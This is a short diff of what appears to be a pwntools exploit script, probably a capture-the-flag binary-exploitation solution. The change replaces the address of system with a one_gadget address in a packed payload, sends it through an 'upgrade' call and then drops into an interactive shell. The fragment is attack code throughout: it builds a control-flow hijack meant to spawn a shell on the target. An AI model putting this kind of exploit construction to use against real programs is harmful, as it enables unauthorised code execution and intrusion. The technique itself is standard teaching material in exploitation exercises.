@@ -76,7 +76,7 @@ payload += p64(1)
 payload += p64(2)
 payload += p64(3)
 payload += p64(0) * 3
-payload += p64(system)
+payload += p64(one_gadget)
 
 upgrade(len(payload), payload, str(30), 5)
 p.interactive()
